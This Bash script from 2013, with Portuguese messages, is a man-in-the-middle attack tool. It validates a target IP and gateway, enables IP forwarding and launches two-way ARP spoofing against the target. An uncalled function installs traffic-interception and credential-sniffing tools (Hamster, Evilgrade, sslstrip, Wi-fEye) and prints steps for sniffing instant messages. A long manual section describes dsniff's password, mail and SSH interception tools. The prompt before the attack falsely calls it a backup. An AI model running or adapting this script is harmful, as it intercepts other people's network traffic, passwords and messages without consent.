#!/bin/bash
#autor j.francisco.o.rocha@gmail.com
# 2013/10

iptarget=$1
gw=$2
interface=$3

function manual () {
echo "https://www.trustedsec.com/downloads/social-engineer-toolkit/"
echo "arpspoof"
echo 	"redirect packets from a target host (or all hosts) on the LAN"
echo 	"intended for another local host by forging ARP replies. this"
echo 	"is an extremely effective way of sniffing traffic on a switch."
echo 	"kernel IP forwarding (or a userland program which accomplishes"
echo 	"the same, e.g. fragrouter :-) must be turned on ahead of time."
echo "dnsspoof"
echo 	"forge replies to arbitrary DNS address / pointer queries on"
echo 	"the LAN. this is useful in bypassing hostname-based access"
echo 	"controls, or in implementing a variety of man-in-the-middle"
echo 	"attacks (HTTP, HTTPS, SSH, Kerberos, etc)."
echo "dsniff"
echo 	"password sniffer. handles FTP, Telnet, SMTP, HTTP, POP,"
echo 	"poppass, NNTP, IMAP, SNMP, LDAP, Rlogin, RIP, OSPF, PPTP"
echo 	"MS-CHAP, NFS, VRRP, YP/NIS, SOCKS, X11, CVS, IRC, AIM, ICQ,"
echo 	"Napster, PostgreSQL, Meeting Maker, Citrix ICA, Symantec"
echo 	"pcAnywhere, NAI Sniffer, Microsoft SMB, Oracle SQL*Net, Sybase"
echo 	"and Microsoft SQL auth info."
echo 	"dsniff automatically detects and minimally parses each"
echo 	"application protocol, only saving the interesting bits, and"
echo 	"uses Berkeley DB as its output file format, only logging"
echo 	"unique authentication attempts. full TCP/IP reassembly is"
echo 	"provided by libnids(3) (likewise for the following tools as"
echo 	"well)."
echo "filesnarf"
echo 	"saves selected files sniffed from NFS traffic in the current"
echo 	"working directory."
echo "macof"
echo 	"flood the local network with random MAC addresses (causing"
echo 	"some switches to fail open in repeating mode, facilitating"
echo 	"sniffing). a straight C port of the original Perl Net::RawIP"
echo 	"macof program."
echo "mailsnarf"
echo 	"a fast and easy way to violate the Electronic Communications"
echo 	"Privacy Act of 1986 (18 USC 2701-2711), be careful. outputs"
echo 	"selected messages sniffed from SMTP and POP traffic in Berkeley"
echo 	"mbox format, suitable for offline browsing with your favorite"
echo 	"mail reader (mail -f, pine, etc.)."
echo "msgsnarf"
echo 	"record selected messages from sniffed AOL Instant Messenger,"
echo 	"ICQ 2000, IRC, and Yahoo! Messenger chat sessions."
echo "sshmitm"
echo 	"SSH monkey-in-the-middle. proxies and sniffs SSH traffic"
echo 	"redirected by dnsspoof(8), capturing SSH password logins, and"
echo 	"optionally hijacking interactive sessions. only SSH protocol"
echo 	"version 1 is (or ever will be) supported - this program is far"
echo 	"too evil already."
echo "sshow"
echo 	"SSH traffic analysis tool. analyzes encrypted SSH-1 and SSH-2"
echo 	"traffic, identifying authentication attempts, the lengths of"
echo 	"passwords entered in interactive sessions, and command line"
echo 	"lengths."
echo "tcpkill"
echo 	"kills specified in-progress TCP connections (useful for"
echo 	"libnids-based applications which require a full TCP 3-whs for"
echo 	"TCB creation)."
echo "tcpnice"
echo 	"slow down specified TCP connections via \"active\" traffic"
echo 	"shaping. forges tiny TCP window advertisements, and optionally"
echo 	"ICMP source quench replies."
echo "urlsnarf"
echo 	"output selected URLs sniffed from HTTP traffic in CLF"
echo 	"(Common Log Format, used by almost all web servers), suitable"
echo 	"for offline post-processing with your favorite web log"
echo 	"analysis tool (analog, wwwstat, etc.)."
echo "webmitm"
echo 	"HTTP / HTTPS monkey-in-the-middle. transparently proxies and"
echo 	"sniffs web traffic redirected by dnsspoof(8), capturing most"
echo 	"\"secure\" SSL-encrypted webmail logins and form submissions."
echo "webspy"
echo 	"sends URLs sniffed from a client to your local Netscape"
echo 	"browser for display, updated in real-time (as the target"
echo 	"surfs, your browser surfs along with them, automagically)."
echo 	"a fun party trick. :-)"
}

function ajuda () {
	echo "./scan_trafic.sh [ip] [gw] [interface]"
	}

function ip_valido () {
	ip=$1
	if [[ $ip =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
		OIFS=$IFS
		IFS='.'
		ip=($ip)
		if [[ ${ip[0]} -le 255 && ${ip[1]} -le 255 && ${ip[2]} -le 255 && ${ip[3]} -le 255 ]]; then
			# echo IP Valido!
			IFS=$OIFS
			else
			echo IP Invalido!
			ajuda
			exit 0
		fi
		else
		echo IP Invalido!
		ajuda
		exit 0
	fi
}

function validacao () {
if [ "$(id -u)" != "0" ]; then
	echo "Tem de executar este script como Super User!"
	ajuda
	exit 0
fi

if [ $# != 3 ]; then
	echo $#
	echo Faltam argumentos!
	ajuda
	exit 0
fi

echo "IP: $iptarget"
ip_valido $iptarget
echo "Gateway: $gw"
ip_valido $gw

if [[ "$interface" == eth* ]] || [[ "$interface" == wlan* ]] ;
then
    echo A interface é $interface
    else
    echo A interface $interface não é valida
    ajuda
    exit 0
fi

if [[ ! -e $(which dsniff) ]]; then
sudo apt-get --yes install dsniff
fi

}

function wi-feye () {
	# http://hackingrelated.wordpress.com/tag/msgsnarf/
	if [[ ! -e $(which dsniff) ]]; then
	sudo apt-get --yes install dsniff
	fi

	if [[ ! -e $(which aircrack-ng) ]]; then
	sudo apt-get --yes install aircrack-ng
	fi

	if [[ ! -e $(which ettercap) ]]; then
	sudo apt-get --yes install ettercap-common ettercap-text-only
	fi

	# INI Hamster
	# http://d-martyn.blogspot.pt/2011/07/tweaking-backtrack-5-for-maximum.html
	sudo apt-get --yes install libpcap0.8-dev
	wget --header='Host: dl.dropboxusercontent.com' --header='User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:24.0) Gecko/20100101 Firefox/24.0' --header='Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' --header='Accept-Language: pt-pt,pt;q=0.8,en;q=0.5,en-us;q=0.3' --header='Referer: https://www.dropbox.com/s/aqpo3bntafi2pu1/hamster-2.0.0.zip' --header='Connection: keep-alive' 'https://dl.dropboxusercontent.com/s/aqpo3bntafi2pu1/hamster-2.0.0.zip?token_hash=AAF4qhxUceEknEoxBwufPNh7EMj3H7e1YWK6zc5ETvpTPQ&dl=1' -O 'hamster-2.0.0.zip' -c
	unzip hamster-2.0.0.zip
	cd hamster/build/gcc4
	make
	cd ../../..
	cd ferret/build/gcc4
	make
	cd ../..
	cd bin
	mv ferret ../../hamster/bin/
	cd ../..
	sudo mv hamster /opt/
	rm -rf ferret
	rm hamster-2.0.0.zip
	#END Hamster

	#INI Scapy
	# http://www.secdev.org/projects/scapy/doc/installation.html
	sudo apt-get --yes install python-scapy python-pyx python-gnuplot python-crypto
	#END Scapy

	#INI pexpect
	sudo apt-get --yes install python-pexpect
	#END pexpect

	#INI Evilgrade
	# http://r00tsec.blogspot.pt/2011/07/howto-install-evilgrade-on-backtrack5.html
	# https://github.com/infobyte/evilgrade
	#http://www.infobytesec.com/
	sudo cpan Data::Dump
	sudo cpan Digest::MD5
	sudo cpan Time::HiRes
	wget --header='Host: codeload.github.com' --header='User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:24.0) Gecko/20100101 Firefox/24.0' --header='Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' --header='Accept-Language: pt-pt,pt;q=0.8,en;q=0.5,en-us;q=0.3' --header='Referer: https://github.com/infobyte/evilgrade' --header='Cookie: km_ai=v2qH84CDUxTzAL4RNKDJHKDRLQs%3D; km_uq=; km_lv=1357925010; logged_in=no' --header='Connection: keep-alive' 'https://codeload.github.com/infobyte/evilgrade/zip/master' -O 'evilgrade-master.zip' -c
	unzip evilgrade-master.zip
	sudo mv evilgrade-master /opt/
	rm evilgrade-master.zip
	#END Evilgrade

	#INI sslstrip
	# http://www.thoughtcrime.org/software/sslstrip/
	wget --header='Host: www.thoughtcrime.org' --header='User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:24.0) Gecko/20100101 Firefox/24.0' --header='Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' --header='Accept-Language: pt-pt,pt;q=0.8,en;q=0.5,en-us;q=0.3' --header='Referer: http://www.thoughtcrime.org/software/sslstrip/' --header='Cookie: _jsuid=2822417767; _eventqueue=%7B%22heatmap%22%3A%5B%5D%2C%22events%22%3A%5B%5D%7D' --header='Connection: keep-alive' 'http://www.thoughtcrime.org/software/sslstrip/sslstrip-0.9.tar.gz' -O 'sslstrip-0.9.tar.gz' -c
	tar zxvf sslstrip-0.9.tar.gz
	cd sslstrip-0.9
	sudo python ./setup.py install
	#END sslstrip

	# INI Wi-fEye
	# http://wi-feye.za1d.com/Installation.php
	#wget http://wi-feye.za1d.com/releases/Wi-fEye-v1.0-beta.tar.gz
	wget --header='Host: wi-feye.za1d.com' --header='User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:24.0) Gecko/20100101 Firefox/24.0' --header='Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' --header='Accept-Language: pt-pt,pt;q=0.8,en;q=0.5,en-us;q=0.3' --header='Referer: http://wi-feye.za1d.com/download.php' --header='Connection: keep-alive' 'http://wi-feye.za1d.com/releases/Wi-fEye-v1.0-beta.tar.gz' -O 'Wi-fEye-v1.0-beta.tar.gz' -c
	mkdir Wi-fEye
	tar -C "Wi-fEye" -xzvf "Wi-fEye-v1.0-beta.tar.gz"
	rm Wi-fEye-v1.0-beta.tar.gz
	cd Wi-fEye
	python install.py
	echo "1.- For run [python Wi-fEye.py]"
	echo "2.- Choose Interface"
	echo "3.- Enable monitor mode=no"
	echo "4.- Choose MITM \(3\)"
	echo "5.- Choose Sniff instant messages \(6\)"
	echo "6.- Hit ENTER for Chose all targets"
	echo "7.- See msgsnarf window ;-\)"
	echo "http://za1d.com/tag/sniff-sniffing-messages-mitm-man-in-the-middle-pentest-hacking-msgsnarf-wi-feye/"
	# END Wi-fEye

	}

validacao $iptarget $gw $interface

read -p "Press [Enter] key to start backup or [Ctrl+C] to abort..."

echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i $interface -t $gw $iptarget &
arpspoof -i $interface -t $iptarget $gw &

function matar_arpspoof () {
declare -a pids
pids=`ps aguwx | grep arpspoof | awk '{print $2}' | xargs`
for thisPid in "${pids[@]:0}"
do
	printf "killing $thisPid \n"
	kill -9 $thisPid
done;
}





# manual



